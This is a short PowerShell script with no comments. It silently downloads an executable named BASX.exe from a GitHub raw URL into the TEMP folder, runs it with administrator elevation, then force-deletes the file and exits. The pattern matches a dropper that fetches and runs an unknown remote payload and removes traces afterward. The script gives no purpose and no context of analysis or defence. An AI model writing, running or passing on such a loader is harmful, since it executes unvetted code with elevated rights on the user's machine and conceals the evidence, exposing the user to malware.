$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
$output = "$env:TEMP\BASX.exe"

$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri $url -OutFile $output

Start-Process -FilePath $output -Verb RunAs -Wait

if (Test-Path $output) {
    Remove-Item -Path $output -Force
}

exit
